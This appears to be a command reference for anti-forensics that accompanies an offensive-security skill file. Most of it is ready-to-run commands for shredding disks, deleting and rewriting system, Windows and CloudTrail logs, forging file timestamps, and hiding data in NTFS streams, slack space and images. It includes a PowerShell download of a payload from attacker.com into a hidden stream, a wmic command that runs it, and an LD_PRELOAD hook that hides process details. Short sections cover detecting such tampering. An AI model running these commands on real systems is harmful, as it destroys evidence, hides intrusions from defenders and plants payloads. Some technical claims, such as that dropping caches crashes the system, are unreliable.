# Payloads: Anti-Forensics

> This file is a companion to `SKILL.md`, containing the anti-forensics command reference manual.
> All commands are for authorized testing environments only.

---

## 1. Secure File Deletion

### shred - File-Level Secure Overwrite

```bash
# Overwrite file with 5 passes of random data, then zero-fill and delete
shred -vfz -n 5 secret.txt

# Overwrite with 3 passes (faster, sufficient for most scenarios)
shred -vfz -n 3 sensitive_data.db

# Overwrite an entire partition (destructive - authorized targets only)
shred -vfz -n 3 /dev/sdb1

# Overwrite specific file and remove with truncate (reduces filesystem metadata)
shred -vfzu -n 5 /tmp/payload.bin

# Overwrite all files in a directory recursively
find /tmp/engagement/ -type f -exec shred -vfz -n 3 {} \;

# Overwrite with exact byte pattern pass then random (DoD 5220.22-M style)
shred -vf -n 1 -z secret.txt
```

### wipe - Directory and Recursive Wiping

```bash
# Recursively wipe a directory and all contents
wipe -rfci /tmp/sensitive/

# Wipe with 34 passes (Gutmann method)
wipe -rfci -Q 34 /tmp/high_value_data/

# Wipe a single file with confirmation
wipe -ci secret_document.pdf

# Wipe a block device (entire partition)
wipe -fcki /dev/sdb1

# Wipe with fast mode (4 passes instead of default 34)
wipe -rfci -Q 4 /tmp/tools/

# Wipe and verify last pass is all zeros
wipe -rfci -Q 3 -F /tmp/loot/
```

---

## 2. Disk/Volume Encryption

### tcplay - TrueCrypt/VeraCrypt Compatible Volumes

```bash
# Create a new encrypted volume file (100MB)
dd if=/dev/zero of=encrypted.vol bs=1M count=100
losetup /dev/loop0 encrypted.vol
tcplay -c -d /dev/loop0
# Follow prompts: set passphrase, confirm

# Create encrypted volume with specific cipher and key size
tcplay -c -d /dev/loop0 --cipher AES-256-XTS

# Map (mount) an existing encrypted volume
tcplay -m encrypted_vol -d /dev/loop0
# Enter passphrase when prompted
mkfs.ext4 /dev/mapper/encrypted_vol  # first time only
mount /dev/mapper/encrypted_vol /mnt/secure/

# Map volume with keyfile instead of passphrase
tcplay -m encrypted_vol -d /dev/loop0 -k keyfile.bin

# Unmap (detach) encrypted volume
umount /mnt/secure/
tcplay -u encrypted_vol
losetup -d /dev/loop0

# Create hidden volume within outer volume (plausible deniability)
# Step 1: Create outer volume normally
tcplay -c -d /dev/loop0 --cipher AES-256-XTS
# Step 2: Write decoy data to outer volume
mkfs.ext4 /dev/mapper/encrypted_vol && mount /dev/mapper/encrypted_vol /mnt/outer/
cp /usr/share/doc/* /mnt/outer/
umount /mnt/outer/ && tcplay -u encrypted_vol
# Step 3: Create hidden volume at specific offset
tcplay -c -d /dev/loop0 --hidden --hidden-from-rc-pt 4096

# Verify volume info without mounting
tcplay --info -d /dev/loop0
```

### LUKS Alternative (Linux Native)

```bash
# Create LUKS encrypted container
dd if=/dev/zero of=luks_vol bs=1M count=200
losetup /dev/loop0 luks_vol
cryptsetup luksFormat /dev/loop0
cryptsetup luksOpen /dev/loop0 secure_vol
mkfs.ext4 /dev/mapper/secure_vol
mount /dev/mapper/secure_vol /mnt/secure/

# Close LUKS volume
umount /mnt/secure/
cryptsetup luksClose secure_vol
losetup -d /dev/loop0
```

---

## 3. Log Cleaning

### logtamper - Unix Log Entry Manipulation

```bash
# Remove all log entries containing a specific IP address
logtamper -f /var/log/auth.log -r "192.168.1.100"

# Remove entries for a specific username
logtamper -f /var/log/auth.log -r "attacker_user"

# Remove entries within a time range
logtamper -f /var/log/auth.log -t "2026-05-15 10:00:00" -T "2026-05-15 14:30:00"

# Remove entries matching both IP and time range
logtamper -f /var/log/auth.log -r "192.168.1.100" -t "2026-05-15 10:00:00" -T "2026-05-15 14:30:00"

# Replace attacker IP with a different IP in log entries
logtamper -f /var/log/auth.log -s "192.168.1.100" -d "10.0.0.50"
```

### Manual Log Cleaning Techniques

```bash
# Remove SSH login entries for attacker IP from auth.log
sed -i '/192.168.1.100/d' /var/log/auth.log

# Remove entries within a time window from syslog
sed -i '/May 15 10:[0-3][0-9]:/d' /var/log/syslog

# Replace attacker IP throughout all log files
for log in /var/log/*.log /var/log/*/*.log; do
  [ -f "$log" ] && sed -i 's/192.168.1.100/10.0.0.50/g' "$log"
done

# Clear bash history and prevent future recording
history -c && history -w
unset HISTFILE
export HISTSIZE=0

# Selectively remove commands from bash history
sed -i '/nmap\|nikto\|sqlmap/d' ~/.bash_history

# Rotate and truncate logs (less suspicious than deletion)
gzip /var/log/auth.log.3 2>/dev/null
cat /var/log/auth.log.2 > /var/log/auth.log.3
cat /var/log/auth.log.1 > /var/log/auth.log.2
# Rebuild auth.log.1 and auth.log without attacker entries

# Remove entries from wtmp/utmp (login records)
# Use logtamper or utmpdump for safe manipulation
utmpdump /var/log/wtmp | grep -v "192.168.1.100" | utmpdump -r -o /var/log/wtmp
```

### Windows Event Log Manipulation

```bash
# Clear specific event log (requires admin, highly detectable)
# PowerShell on target:
wevtutil cl Security

# Clear all event logs
wevtutil cl Application
wevtutil cl System
wevtutil cl Security

# Delete specific events by EventID (requires tooling)
# Using PowerShell to filter and re-export:
Get-WinEvent -LogName Security | Where-Object { $_.TimeCreated -gt (Get-Date "2026-05-15") } |
  Where-Object { $_.Message -notmatch "192.168.1.100" } |
  Export-Csv cleaned_events.csv
```

---

## 4. Timestamp Manipulation

### timestomp - NTFS MACE Timestamp Forging

```bash
# View current MACE timestamps of a file (in Meterpreter session)
timestomp secret.txt -v

# Modify all four MACE timestamps (Modified, Accessed, Created, Entry Modified)
timestomp secret.txt -m "01/01/2024 08:30:00"
timestomp secret.txt -a "01/01/2024 08:30:00"
timestomp secret.txt -c "01/01/2024 08:30:00"
timestomp secret.txt -e "01/01/2024 08:30:00"

# Set all MACE timestamps in one command
timestomp secret.txt -z "01/01/2024 08:30:00"

# Copy timestamps from a legitimate file to a malicious file
timestomp malicious.exe -f legitimate.exe

# Set modified timestamp to match surrounding files in directory
timestomp payload.dll -m "03/15/2025 14:22:17"
```

### Unix Timestamp Manipulation

```bash
# Set file timestamps to a specific date (touch)
touch -t 202401010830 secret.txt       # YYYYMMDDhhmm
touch -d "2024-01-01 08:30:00" secret.txt

# Copy timestamps from another file
touch -r legitimate.conf malicious.conf

# Set specific atime and mtime separately
touch -a -t 202401010830 secret.txt    # access time only
touch -m -t 202401010830 secret.txt    # modification time only

# Batch set timestamps for all engagement files to match a legitimate baseline
find /opt/tools/ -type f -exec touch -t 202401010830 {} \;

# Modify inode change time (ctime) - requires filesystem clock manipulation
# Note: ctime cannot be directly set on ext4; it updates on any metadata change
# Workaround: change system clock, modify file, restore system clock
faketime '2024-01-01 08:30:00' touch secret.txt
```

---

## 5. Data Hiding

### Alternate Data Streams (NTFS)

```bash
# Hide data in an NTFS alternate data stream (from Windows target)
# Create ADS on a legitimate file
echo "secret payload data" > legitimate.txt:hidden_stream

# Execute payload from ADS
wmic process call create "cmd.exe /c more < legitimate.txt:hidden_stream > C:\temp\payload.bat & C:\temp\payload.bat"

# List ADS on a file
more < legitimate.txt:hidden_stream
# Or using PowerShell:
Get-Item legitimate.txt -Stream *

# Download file into ADS using PowerShell
Invoke-WebRequest -Uri "http://attacker.com/payload.exe" -OutFile "legitimate.txt:payload.exe"

# Execute payload directly from ADS
wmic process call create "legitimate.txt:payload.exe"
```

### Filesystem Data Hiding (Linux)

```bash
# Hide data in slack space after a file
# Create a small file that leaves slack space in its last block
dd if=/dev/urandom of=small.txt bs=1 count=100
# Use bmap to write data into slack space after small.txt
bmap --mode putslack small.txt < hidden_payload.bin

# Hide files by prepending a dot (basic, but often overlooked in rapid triage)
mkdir /dev/...    # triple-dot directory
cp secret_data /dev/.../hidden_file

# Hide data in extended attributes
setfattr -n user.hidden -v "$(cat secret.txt | base64)" legitimate_file.txt
getfattr -n user.hidden legitimate_file.txt

# Hide files using immutable attribute (prevents casual deletion/discovery)
chattr +i /tmp/hidden_file

# Create a file with a name indistinguishable from legitimate system files
# Example: using Unicode lookalike characters
cp payload "svchost.exe"   # using Cyrillic 'o' instead of Latin
```

---

## 6. Steganographic Hiding

### steghide - Image and Audio Steganography

```bash
# Embed a secret file into a JPEG carrier image
steghide embed -cf vacation_photo.jpg -ef exfil_data.txt

# Embed with a specific passphrase
steghide embed -cf vacation_photo.jpg -ef exfil_data.txt -p "engagement_key_2026"

# Embed without passphrase (empty string - useful for automated extraction)
steghide embed -cf vacation_photo.jpg -ef exfil_data.txt -p ""

# Embed with maximum compression
steghide embed -cf carrier.jpg -ef payload.bin -z 9

# Check embedding capacity before embedding
steghide info carrier.jpg

# Extract hidden data from a steganographic carrier
steghide extract -sf stego_image.jpg -p "engagement_key_2026"

# Extract without passphrase
steghide extract -sf stego_image.jpg -p ""

# Verify carrier file appears normal after embedding
file carrier.jpg
exiftool carrier.jpg | grep -i "comment\|software"
md5sum original.jpg stego_image.jpg   # hashes will differ
```

### Advanced Steganographic Techniques

```bash
# Embed into WAV audio carrier (higher capacity)
steghide embed -cf song.wav -ef large_payload.bin -p "key123"

# Embed into BMP carrier (lossless, higher capacity than JPEG)
steghide embed -cf image.bmp -ef secret.txt -p "key123"

# Batch extract from multiple steganographic files
for f in *.jpg; do
  echo "Testing: $f"
  steghide extract -sf "$f" -p "" -f "/tmp/extracted_$(basename "$f").txt" 2>/dev/null && \
    echo "  [+] Extracted from $f"
done

# Verify steganographic file passes visual inspection
compare original.jpg stego.jpg diff.png   # ImageMagick diff
identify stego.jpg                         # verify valid image

# Statistical analysis to check for detectable anomalies
# (if you can detect it, the target's forensic team can too)
stegdetect stego_image.jpg 2>/dev/null
```

---

## 7. Anti-Forensic Countermeasures Testing

### bulk_extractor - Verify Anti-Forensic Effectiveness

```bash
# Scan a disk image for all recoverable artifacts
bulk_extractor -o /tmp/be_output target_disk.dd

# Scan with specific feature scanners enabled
bulk_extractor -o /tmp/be_output -e email -e url -e tcp target_disk.dd

# Scan a specific partition (with offset)
bulk_extractor -o /tmp/be_output -o 2048 target_disk.dd

# Check if shredded files left any recoverable fragments
bulk_extractor -o /tmp/be_post_cleanup post_cleanup_image.dd
diff <(cat /tmp/be_output/email.txt) <(cat /tmp/be_post_cleanup/email.txt)

# Search for credit card patterns, phone numbers, and SSNs
bulk_extractor -o /tmp/be_output -e ccn -e telephone -e ssn target_disk.dd

# Run with maximum threads for speed
bulk_extractor -o /tmp/be_output -j 8 target_disk.dd

# Generate histogram of found patterns
bulk_extractor -o /tmp/be_output -H target_disk.dd
```

### Comprehensive Cleanup Verification

```bash
# Verify shred effectiveness: attempt recovery with foremost
foremost -t all -i post_cleanup_image.dd -o /tmp/recovery_attempt/
ls -la /tmp/recovery_attempt/

# Verify no steganographic tools are detectable
strings target_disk.dd | grep -i "steghide\|stegembed\|stego"

# Verify no encrypted volume headers remain detectable
strings target_disk.dd | grep -i "truecrypt\|veracrypt\|tcplay"
binwalk target_disk.dd | grep -i "crypto\|encrypt"

# Verify timestamp consistency (detect timestomp artifacts)
# On NTFS: compare $STANDARD_INFORMATION vs $FILE_NAME timestamps
analyzeMFT.py -f \$MFT -o mft_analysis.csv
awk -F',' '{if($4 != $6) print "TIMESTAMP MISMATCH: "$0}' mft_analysis.csv

# Verify log continuity (detect logtamper gaps)
awk 'NR>1 {
  split($3,t,":"); split(prev_time,pt,":")
  gap=(t[1]*3600+t[2]*60+t[3])-(pt[1]*3600+pt[2]*60+pt[3])
  if(gap > 300) print "GAP: "prev_line" -> "$0" ("gap"s)"
} {prev_time=$3; prev_line=$0}' /var/log/auth.log

# Verify swap/partition has no residual data
strings /dev/sda1 | grep -iE "password|secret|token|key" | head -20

# Verify no loop devices remain from tcplay operations
losetup -a
dmsetup ls
```

---

## 8. Memory Anti-Forensics

### Volatile Data Considerations

```bash
# Clear RAM contents before shutdown (Linux)
# WARNING: This will crash the system immediately
echo 3 > /proc/sys/vm/drop_caches

# Securely wipe swap space before shutdown
swapoff -a
shred -vfz -n 3 /dev/sda2    # where /dev/sda2 is swap partition
mkswap /dev/sda2

# Prevent core dumps that might contain sensitive data
ulimit -c 0
echo "* hard core 0" >> /etc/security/limits.conf

# Clear page cache, dentries, and inodes
sync && echo 3 > /proc/sys/vm/drop_caches

# Overwrite tmpfs (RAM-backed filesystem) contents
mount -t tmpfs -o size=100M tmpfs /tmp/secure/
# After use:
umount /tmp/secure/
```

---

## 9. Network Anti-Forensics

### Covering Network Traces

```bash
# Use encrypted tunnels to prevent network forensics from reading payloads
ssh -D 9050 user@pivot_server    # SOCKS proxy over SSH

# Route through Tor to obscure source IP
proxychains nmap -sT target_ip

# Use DNS over HTTPS to prevent DNS query logging
# Configure systemd-resolved:
echo "DNSOverHTTPS=yes" >> /etc/systemd/resolved.conf

# Clear ARP cache to remove evidence of local network presence
ip neigh flush all
ip -s -s neigh flush all

# Remove firewall rule traces
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
```

---

## 10. Timestomp Detection and Counter-Countermeasures

### Analyzing Timestamp Consistency

```bash
# Check for timestamp anomalies on ext4 using debugfs
debugfs -R "stat <inode_number>" /dev/sda1 2>/dev/null | grep -E "time"

# Compare ctime vs mtime to detect touch-based timestamp forging
stat -c '%n: mtime=%y ctime=%z' /target/directory/* | \
  awk -F'=' '{split($2,a," "); split($3,b," "); if(a[1]!=b[1]) print "SUSPICIOUS: "$0}'

# NTFS: extract and compare $STANDARD_INFORMATION vs $FILE_NAME timestamps
analyzeMFT.py -f /mnt/windows/'$MFT' -o /tmp/mft_analysis.csv
awk -F',' 'NR>1 && $4!=$6 {print "TIMESTAMP MISMATCH: "$0}' /tmp/mft_analysis.csv

# Identify files with identical timestamps (bulk timestomp indicator)
find /target/directory -type f -printf '%T@\n' | sort | uniq -c | sort -rn | head -10

# Check for future timestamps (impossible timestamps = tampering)
find /target/directory -newer /tmp/now_marker -type f
```

---

## 11. Secure Wipe and Disk Sanitization

### Full Disk Sanitization

```bash
# Wipe entire disk with shred (DOD 5220.22-M pattern: zeros, ones, random)
shred -vfz -n 3 /dev/sdb

# Use dd for faster full-disk zero write (single pass)
dd if=/dev/zero of=/dev/sdb bs=1M status=progress

# Use dd with urandom for random data write
dd if=/dev/urandom of=/dev/sdb bs=1M status=progress

# Verify disk is wiped (should show all zeros)
dd if=/dev/sdb bs=1M count=100 | xxd | grep -v "0000 0000 0000 0000 0000 0000 0000 0000"

# NVMe secure erase (faster than overwrite, hardware-level)
nvme format -s 1 /dev/nvme0n1

# ATA secure erase (HDD/SSD firmware-level wipe)
hdparm --user-master u --security-set-pass Erase123 /dev/sda
hdparm --user-master u --security-erase Erase123 /dev/sda
```

### Selective File Slack Space Wiping

```bash
# Wipe slack space after a file (fill to end of last block with zeros)
# Create a file that fills the rest of the allocated block
FILESIZE=$(stat -c '%s' target_file.txt)
BLOCKSIZE=$(stat -c '%o' target_file.txt)
REMAINDER=$((BLOCKSIZE - (FILESIZE % BLOCKSIZE)))
dd if=/dev/zero bs=1 count=$REMAINDER >> target_file.txt 2>/dev/null
truncate -s $FILESIZE target_file.txt

# Wipe all unallocated space on a partition (destroys deleted files)
dd if=/dev/zero of=/mnt/target/zero_fill bs=1M status=progress
rm -f /mnt/target/zero_fill
sync
```

---

## 12. Process and Memory Forensics Evasion

### Hiding Process Information

```bash
# Mount /proc with hidepid to prevent cross-user process visibility
mount -o remount,hidepid=2 /proc

# Use unshare to create isolated PID namespace for processes
unshare --pid --fork --mount-proc /bin/bash

# Clear /proc/self/maps exposure (limited effectiveness)
# Instead, use LD_PRELOAD to hook file-reading functions
cat > /tmp/hook.c << 'EOF'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>

FILE *fopen(const char *path, const char *mode) {
    FILE *(*orig_fopen)(const char *, const char *) = dlsym(RTLD_NEXT, "fopen");
    if (strstr(path, "maps") || strstr(path, "cmdline")) return NULL;
    return orig_fopen(path, mode);
}
EOF
gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c
LD_PRELOAD=/tmp/hook.so /path/to/target_binary
```

### Anti-Memory-Dump Techniques

```bash
# Prevent ptrace-based memory dumping (gdb, gdbserver, process dump)
# Enable YAMA ptrace_scope restriction
echo 2 > /proc/sys/kernel/yama/ptrace_scope

# Use prctl to disable ptrace from within a process
# Compile into target binary:
cat > /tmp/no_ptrace.c << 'EOF'
#include <sys/prctl.h>
int main() {
    prctl(PR_SET_DUMPABLE, 0);
    // ... rest of program
}
EOF
gcc -o /tmp/no_ptrace /tmp/no_ptrace.c

# Lock memory pages to prevent swap-out (mlock)
# This keeps sensitive data in RAM only
python3 -c "
import ctypes, ctypes.util
libc = ctypes.CDLL(ctypes.util.find_library('c'))
libc.mlockall(3)  # MCL_CURRENT | MCL_FUTURE
import time; time.sleep(3600)
"
```

---

## 13. Comprehensive Anti-Forensic Cleanup Script

### Automated Cleanup Script

```bash
#!/bin/bash
# Anti-forensic cleanup script - authorized engagement cleanup only

echo "[1] Securely deleting engagement tools and output"
find /tmp/engagement/ -type f -exec shred -vfz -n 3 {} \; 2>/dev/null
rm -rf /tmp/engagement/

echo "[2] Cleaning bash history"
history -c && history -w
unset HISTFILE
export HISTSIZE=0

echo "[3] Removing engagement indicators from logs"
for log in /var/log/auth.log /var/log/syslog /var/log/kern.log; do
  [ -f "$log" ] && sed -i '/ENGAGEMENT_IP/d' "$log" 2>/dev/null
done

echo "[4] Restoring file timestamps from baseline"
while read -r ts file; do
  touch -t "$ts" "$file" 2>/dev/null
done < /tmp/timestamp_baseline.txt

echo "[5] Wiping swap space"
sudo swapoff -a
sudo shred -vfz -n 1 /dev/sda2 2>/dev/null
sudo mkswap /dev/sda2 2>/dev/null

echo "[6] Clearing page cache and dentries"
sync && echo 3 | sudo tee /proc/sys/vm/drop_caches > /dev/null

echo "[7] Verifying cleanup"
echo "Remaining indicators:"
grep -r "ENGAGEMENT_IP" /var/log/ 2>/dev/null | wc -l
ls -la /tmp/engagement/ 2>/dev/null || echo "Engagement directory removed"

echo "[CLEANUP COMPLETE]"
```

### Cleanup Verification with Multiple Tools

```bash
# Post-cleanup forensic verification script
echo "=== Post-Cleanup Verification ==="

# Check 1: File recovery attempt
foremost -t all -i /dev/loop0 -o /tmp/verify_recovery/ 2>/dev/null
echo "Recovered files: $(ls /tmp/verify_recovery/ 2>/dev/null | wc -l)"

# Check 2: String search for engagement markers
strings /dev/loop0 | grep -c "ENGAGEMENT_MARKER"

# Check 3: SleuthKit timeline analysis
fls -r -m "/" -o 2048 post_cleanup.dd | mactime -b - | grep "ENGAGEMENT_DATE"

# Check 4: Verify swap is clean
strings /dev/sda2 | grep -cE "password|secret|token"

# Check 5: Verify no loop devices remain
losetup -a | grep -c "enc_vol"
dmsetup ls | grep -c "encrypted"
```

### Windows Anti-Forensic Cleanup Commands

```powershell
# Clear Windows event logs (requires admin)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear Prefetch files
del /Q C:\Windows\Prefetch\*.pf

# Clear Recent Items
del /Q "%APPDATA%\Microsoft\Windows\Recent\*.*"

# Clear Windows Temp
del /Q /S "%TEMP%\*.*"

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath
Clear-History
```

### macOS Anti-Forensic Cleanup

```bash
# Clear macOS system logs
sudo rm -rf /var/log/system.log*
sudo rm -rf /var/log/diagnostic_messages/*

# Clear macOS quarantine database
xattr -cr /path/to/engagement/tools/

# Clear macOS LaunchAgents persistence
launchctl unload /tmp/com.engagement.agent.plist 2>/dev/null
rm -f /tmp/com.engagement.agent.plist

# Reset macOS firewall to defaults
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on

# Flush DNS cache on macOS
sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder
```

### Anti-Forensic Tool Verification and Testing

```bash
# Verify shred effectiveness by attempting recovery
dd if=/dev/zero of=/tmp/test_shred.img bs=1M count=10
mkfs.ext4 /tmp/test_shred.img
mount -o loop /tmp/test_shred.img /mnt/test_shred
echo "SECRET_DATA_MARKER_12345" > /mnt/test_shred/secret.txt
shred -vfz -n 3 /mnt/test_shred/secret.txt
umount /mnt/test_shred

# Attempt recovery
foremost -t all -i /tmp/test_shred.img -o /tmp/shred_verify/
ls -la /tmp/shred_verify/

# Verify no strings remain
strings /tmp/test_shred.img | grep "SECRET_DATA_MARKER"

# Compare wipe vs shred effectiveness
dd if=/dev/zero of=/tmp/test_wipe.img bs=1M count=10
mkfs.ext4 /tmp/test_wipe.img
mount -o loop /tmp/test_wipe.img /mnt/test_wipe
echo "WIPE_TEST_MARKER_98765" > /mnt/test_wipe/secret.txt
wipe -sf /mnt/test_wipe/secret.txt
umount /mnt/test_wipe
strings /tmp/test_wipe.img | grep "WIPE_TEST_MARKER"
```

---

## 14. Advanced Shred Variants and Custom Overwrite Patterns

### Custom Pass Patterns

```bash
# DoD 5220.22-M style: zeros, ones, random
dd if=/dev/zero of=target_file bs=1M count=$(stat -c '%s' target_file) conv=notrunc
dd if=/dev/urandom of=target_file bs=1M count=$(stat -c '%s' target_file) conv=notrunc
dd if=/dev/zero of=target_file bs=1M count=$(stat -c '%s' target_file) conv=notrunc
rm -f target_file
```

### shred with Specific Byte Patterns

```bash
# Overwrite with 0xFF pattern first, then random, then zeros
echo -ne '\xff' > /tmp/pattern.bin
dd if=/tmp/pattern.bin of=target_file bs=1 count=1 conv=notrunc
shred -vfz -n 2 target_file
rm -f /tmp/pattern.bin
```

### Parallel shred Across Multiple Disks

```bash
# Wipe multiple disks simultaneously for speed
for disk in /dev/sdb /dev/sdc /dev/sdd; do
  shred -vfz -n 3 "$disk" &
done
wait
echo "All disk wipes completed"
```

### Secure File Deletion with scrub

```bash
# scrub with DoD 5220.22-M pattern
scrub -p dod /dev/sdb1

# scrub with random pattern
scrub -p random /tmp/sensitive_dir/

# scrub with German BCI pattern
scrub -p bci /dev/sdb1

# scrub a file (overwrites then deletes)
scrub -p nnsa /tmp/secret.doc
```

---

## 15. Encrypted Container Automation

### LUKS Container with Keyfile Automation

```bash
# Generate a random keyfile for LUKS
dd if=/dev/urandom of=/tmp/luks_keyfile bs=512 count=4
chmod 600 /tmp/luks_keyfile

# Create LUKS container with keyfile
dd if=/dev/zero of=/tmp/secure_container.luks bs=1M count=500
cryptsetup luksFormat /tmp/secure_container.luks /tmp/luks_keyfile
cryptsetup luksOpen --key-file=/tmp/luks_keyfile /tmp/secure_container.luks secure_data
mkfs.ext4 /dev/mapper/secure_data
mount /dev/mapper/secure_data /mnt/secure_data

# After use: close and wipe keyfile
umount /mnt/secure_data
cryptsetup luksClose secure_data
shred -vfz -n 5 /tmp/luks_keyfile
rm -f /tmp/secure_container.luks
```

### VeraCrypt Hidden Volume via Command Line

```bash
# Create outer volume (50MB)
veracrypt --text --create /tmp/outer_vol.hc --size 50M --volume-type normal \
  --encryption AES --hash SHA-512 --filesystem FAT --password "outer_pass"

# Create hidden volume inside (20MB)
veracrypt --text --create /tmp/outer_vol.hc --size 20M --volume-type hidden \
  --encryption AES --hash SHA-512 --filesystem FAT --password "hidden_pass" \
  --pim 0 --non-interactive

# Mount hidden volume
veracrypt --text --mount /tmp/outer_vol.hc /mnt/hidden --password "hidden_pass" --protect-hidden no
```

---

## 16. Advanced Log Cleaning Techniques

### Selective Journalctl Cleaning

```bash
# Remove specific entries from systemd journal
journalctl --rotate
journalctl --vacuum-time=1s

# Filter journal by specific unit and time range
journalctl -u ssh --since "2026-05-15 10:00" --until "2026-05-15 14:00" > /tmp/ssh_entries.txt

# Vacuum journal keeping only last hour
journalctl --vacuum-time=1h
```

### Syslog-ng and Rsyslog Manipulation

```bash
# Stop logging temporarily during authorized operations
systemctl stop rsyslog
systemctl stop syslog-ng

# Perform authorized operations without logging
# ...

# Restart logging and verify
systemctl start rsyslog
logger -p auth.info "Log service restarted after maintenance"
```

### Windows Event Log Selective Deletion

```powershell
# Delete specific EventID entries using PowerShell (requires admin)
Get-WinEvent -LogName Security | Where-Object {
  $_.TimeCreated -gt (Get-Date "2026-05-15") -and
  $_.Message -match "192.168.1.100"
} | ForEach-Object { $_.Message } | Out-Null
# Note: Direct deletion requires specialized tools or WEF filtering
```

---

## 17. Browser Forensics Anti-Forensics

### Firefox Artifact Cleanup

```bash
# Clear Firefox browsing data via command line
rm -rf ~/.mozilla/firefox/*.default-release/{places.sqlite,cookies.sqlite,formhistory.sqlite,downloads.sqlite,sessionstore.jsonlz4}
rm -rf ~/.mozilla/firefox/*.default-release/cache2/
rm -rf ~/.mozilla/firefox/*.default-release/sessionstore-backups/

# Clear Firefox cached credentials
rm -f ~/.mozilla/firefox/*.default-release/logins.json
rm -f ~/.mozilla/firefox/*.default-release/key4.db
```

### Chromium/Chrome Artifact Cleanup

```bash
# Clear Chrome browsing data
rm -rf ~/.config/google-chrome/Default/{History,Cookies,"Login Data","Web Data"}
rm -rf ~/.config/google-chrome/Default/Cache/
rm -rf ~/.config/google-chrome/Default/Session\ Storage/

# Clear Chrome DNS prefetch cache
rm -f ~/.config/google-chrome/Default/"Network Action Predictor"
```

---

## 18. Swap and Virtual Memory Anti-Forensics

### Encrypted Swap Configuration

```bash
# Set up encrypted swap to prevent memory forensics on swap pages
# Method 1: Use random key each boot
echo "/dev/sda2 none swap sw,encryptrandom 0 0" >> /etc/fstab

# Method 2: LUKS-encrypted swap
cryptsetup luksFormat /dev/sda2 --key-file=/dev/urandom --keyfile-size=32
cryptsetup luksOpen /dev/sda2 crypt_swap --key-file=/dev/urandom --keyfile-size=32
mkswap /dev/mapper/crypt_swap
swapon /dev/mapper/crypt_swap

# Verify encrypted swap is active
cat /proc/swaps
swapon --show
```

### Emergency Memory Wipe Script

```bash
#!/bin/bash
# Emergency memory wipe for authorized engagement cleanup
# WARNING: This will crash the system

# Fill all available RAM with zeros
cat /dev/zero > /tmp/memory_fill 2>/dev/null
rm -f /tmp/memory_fill

# Drop all caches
sync && echo 3 > /proc/sys/vm/drop_caches

# Wipe swap and reinitialize
swapoff -a
dd if=/dev/urandom of=/dev/sda2 bs=1M status=progress
mkswap /dev/sda2
swapon -a
```

---

## 19. Filesystem-Level Anti-Forensics

### Ext4 Extended Attributes Manipulation

```bash
# Hide data in extended attributes (often missed by forensic tools)
setfattr -n user.payload -v "$(cat secret.txt | base64)" /var/log/somefile.log
getfattr -n user.payload /var/log/somefile.log | cut -d= -f2 | base64 -d

# List all extended attributes on files in a directory
getfattr -R -d -m - /var/log/ 2>/dev/null
```

### NTFS Alternate Data Stream Operations

```powershell
# Create hidden data stream in legitimate file
cmd /c "echo secret_data > C:\Windows\Temp\legitimate.txt:hidden"

# Read hidden data stream
cmd /c "more < C:\Windows\Temp\legitimate.txt:hidden"

# List all data streams on a file
powershell -c "Get-Item C:\Windows\Temp\legitimate.txt -Stream *"
```

### tmpfs RAM-Disk for Ephemeral Operations

```bash
# Create RAM-disk for operations that should never touch disk
mount -t tmpfs -o size=512M,mode=0700 tmpfs /mnt/ramdisk/

# Perform all operations in /mnt/ramdisk/
# Data disappears on unmount or reboot
umount /mnt/ramdisk/
```

---

## 20. Anti-Forensic Testing Automation

### Bulk Shred Verification Script

```bash
#!/bin/bash
# Test shred effectiveness across different pass counts
IMG="/tmp/test_shred.img"
for passes in 1 3 5 7; do
  dd if=/dev/zero of="$IMG" bs=1M count=5 2>/dev/null
  mkfs.ext4 -F "$IMG" 2>/dev/null
  mount -o loop "$IMG" /mnt/test
  echo "UNIQUE_MARKER_${passes}_$(date +%s)" > /mnt/test/target.txt
  umount /mnt/test
  shred -vfz -n $passes "$(losetup -j "$IMG" | cut -d: -f1)" 2>/dev/null
  result=$(strings "$IMG" | grep "UNIQUE_MARKER_${passes}")
  [ -z "$result" ] && echo "PASS: $passes passes sufficient" || echo "FAIL: $passes passes - marker found"
  losetup -D
  rm -f "$IMG"
done
```

### SleuthKit Anti-Forensic Validation

```bash
# Use fls to verify deleted files are unrecoverable
fls -r -o 2048 post_cleanup.dd | grep -i "deleted"

# Use icat to attempt recovery of known-deleted file
icat -o 2048 post_cleanup.dd $(fls -r -o 2048 post_cleanup.dd | grep "secret.txt" | awk '{print $2}' | tr -d ':') | xxd | head -5

# Verify no recoverable file fragments remain
srch_strings -a post_cleanup.dd | grep -c "SENSITIVE_PATTERN"
```

---

## 21. USB and Removable Media Anti-Forensics

### USB History Cleanup

```bash
# Remove USB device history from Windows registry
# reg delete "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR" /f
# reg delete "HKLM\SYSTEM\CurrentControlSet\Enum\USB" /f

# Remove USB mount history on Linux
sudo shred -vfz -n 3 /var/log/syslog 2>/dev/null
sudo journalctl --vacuum-time=1s
```

### Secure USB Drive Wipe

```bash
# Wipe entire USB drive including hidden areas
shred -vfz -n 3 /dev/sdb
hdparm --user-master u --security-erase NULL /dev/sdb 2>/dev/null
```

---

## 22. Cloud Storage Anti-Forensics

### AWS S3 Secure Deletion

```bash
# Delete all versions of S3 objects (including delete markers)
aws s3api delete-objects --bucket target-bucket --delete "$(aws s3api list-object-versions --bucket target-bucket --query '{Objects: Versions[].{Key:Key,VersionId:VersionId}}' --output json)"

# Remove incomplete multipart uploads
aws s3api abort-multipart-upload --bucket target-bucket --key sensitive-file --upload-id UPLOAD_ID
```

### Cloud Log Cleanup

```bash
# AWS CloudTrail log cleanup (authorized engagements only)
aws logs delete-log-group --log-group-name /aws/cloudtrail
aws logs create-log-group --log-group-name /aws/cloudtrail
```

### Docker Container Anti-Forensics

```bash
# Remove Docker container and image traces
docker rm -f $(docker ps -aq) 2>/dev/null
docker system prune -af --volumes 2>/dev/null
shred -vfz -n 3 /var/lib/docker/overlay2/*/diff/tmp/* 2>/dev/null
```
